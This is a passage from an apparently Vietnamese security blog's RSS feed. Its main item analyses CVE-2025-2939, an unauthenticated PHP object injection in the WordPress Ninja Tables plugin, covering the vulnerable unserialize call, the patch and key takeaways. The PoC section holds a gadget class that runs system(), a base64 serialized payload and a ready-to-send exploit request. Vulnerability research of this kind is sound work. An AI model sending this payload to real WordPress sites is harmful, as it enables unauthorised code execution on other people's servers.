1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/w3-total-cache/vulnerability/wordpress-w3-total-cache-plugin-2-8-13-unauthenticated-command-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin &amp;lt; 2.8.13 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2939 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-21-cve-2025-2939/</link>
      <pubDate>Fri, 21 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-21-cve-2025-2939/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin Ninja Tables – Easy Data Table Builder của WordPress tồn tại lỗ hổng &lt;strong&gt;PHP Object Injection&lt;/strong&gt; trong tất cả các phiên bản đến 5.0.18, do việc giải tuần tự (deserialization) dữ liệu không tin cậy từ tham số &lt;code&gt;args[callback]&lt;/code&gt;. Lỗ hổng này cho phép kẻ tấn công chưa xác thực chèn một đối tượng PHP độc hại.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2939&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2939&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.0.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0.19&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-tables/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables – Easy Data Table Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Ninja Tables – Easy Data Table Builder&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0.18&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0.19&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v5.0.18):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback = unserialize(base64_decode($params[&amp;#39;callback&amp;#39;]));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đoạn mã này, hàm &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; được gọi trực tiếp trên dữ liệu người dùng (&lt;code&gt;$params[&#39;callback&#39;]&lt;/code&gt; sau khi giải mã base64). Điều này tạo ra lỗ hổng nghiêm trọng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy cơ Object Injection&lt;/strong&gt;: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến &lt;strong&gt;Object Injection&lt;/strong&gt; và có khả năng tiến tới &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thiếu kiểm tra an toàn&lt;/strong&gt;: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không có cơ chế fallback&lt;/strong&gt;: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v5.0.19):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-21-cve-2025-2939/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-21-cve-2025-2939/diff.png&#39; alt=&#34;Diff&#34; height=&#34;746&#34; width=&#34;1813&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thay thế &lt;code&gt;unserialize()&lt;/code&gt; bằng &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Không còn dùng &lt;code&gt;unserialize()&lt;/code&gt; → loại bỏ hoàn toàn khả năng &lt;code&gt;PHP Object Injection&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;getCallback()&lt;/code&gt; được gọi trong hàm &lt;code&gt;registerAsyncRequestHandler()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function registerAsyncRequestHandler()&#xA;{&#xA;    $action = static::makeAsyncRequestAction();&#xA;&#xA;    App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() {&#xA;        &#xA;        $request = App::make(&amp;#39;request&amp;#39;);&#xA;        &#xA;        $requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;        &#xA;        $requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&#xA;        &#xA;        $client = Client::make($requestUrl);&#xA;        &#xA;        $params = $request-&amp;gt;except(&#xA;            &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;        )[&amp;#39;args&amp;#39;];&#xA;&#xA;        $callback = static::getCallback($params);&#xA;        ...&#xA;    });&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm đăng ký một Ajax endpoint cho người dùng chưa xác thực (&lt;code&gt;admin_post_nopriv_&lt;/code&gt;) với &lt;code&gt;action&lt;/code&gt; được lấy từ &lt;code&gt;makeAsyncRequestAction()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected static function makeAsyncRequestAction()&#xA;{&#xA;    return &amp;#39;wpf-async-request-&amp;#39;.sha1(&#xA;        App::config()-&amp;gt;get(&amp;#39;app.slug&amp;#39;)&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Giá trị trả về là chuỗi &lt;code&gt;&amp;quot;wpf-async-request-&amp;quot;&lt;/code&gt; nối với &lt;code&gt;sha1()&lt;/code&gt; của &lt;code&gt;app.slug&lt;/code&gt;. Biết slug của plugin là &lt;code&gt;ninja-tables&lt;/code&gt;, giá trị cuối cùng sẽ là:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$params&lt;/code&gt; là toàn bộ dữ liệu trong &lt;code&gt;args[...]&lt;/code&gt; của request, sau khi bỏ đi các thông tin điều khiển (&lt;code&gt;action&lt;/code&gt;, &lt;code&gt;args.url&lt;/code&gt;, &lt;code&gt;args.method&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Khi gửi request tới endpoint &lt;code&gt;/wp-admin/admin-post.php&lt;/code&gt; với &lt;code&gt;action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt; thì &lt;code&gt;getCallback($params)&lt;/code&gt; sẽ được gọi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[callback]=base64_payload&amp;#34;]&#xA;    --&amp;gt; B[&amp;#34;WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Plugin handler calls getCallback($params)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Decode base64 and unserialize payload&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Malicious object instantiated → RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo class để test đặt trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Cho request đi qua proxy của BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;Gửi lại request với args[callback] chứa chuỗi serialized được encode base64&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;args[callback] = base64_encode(&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:4:&amp;#34;ls /&amp;#34;;}&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[callback]=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ== HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-21-cve-2025-2939/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-21-cve-2025-2939/result.png&#39; alt=&#34;Result&#34; height=&#34;828&#34; width=&#34;1471&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Các phiên bản &amp;lt;= 5.0.18 của plugin Ninja Tables xử lý tham số &lt;code&gt;args[callback]&lt;/code&gt; không an toàn, dẫn đến việc thực thi &lt;code&gt;unserialize()&lt;/code&gt; trên dữ liệu người dùng mà không có bất kỳ bước xác thực nào. Điều này cho phép kẻ tấn công chưa xác thực đưa vào payload chứa object độc hại và thực thi mã trên server. Bản cập nhật 5.0.19 loại bỏ hoàn toàn việc sử dụng &lt;code&gt;unserialize()&lt;/code&gt; và thay thế bằng &lt;code&gt;json_decode&lt;/code&gt;, giải quyết triệt để lỗ hổng.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; không được phép dùng cho dữ liệu nhận từ client nếu không có xác thực.&lt;/li&gt;&#xA;&lt;li&gt;Ajax hook &lt;code&gt;admin_post_nopriv_*&lt;/code&gt; mở bề mặt tấn công cho người dùng chưa đăng nhập.&lt;/li&gt;&#xA;&lt;li&gt;Chỉ cần một request HTTP là có thể kích hoạt khai thác.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá 5.0.19 xử lý đúng hướng bằng cách chuyển sang định dạng an toàn hơn như JSON.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-php-object-injection-to-limited-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables – Easy Data Table Builder Plugin &amp;lt;= 5.0.18 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53572 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/</link>
      <pubDate>Thu, 20 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 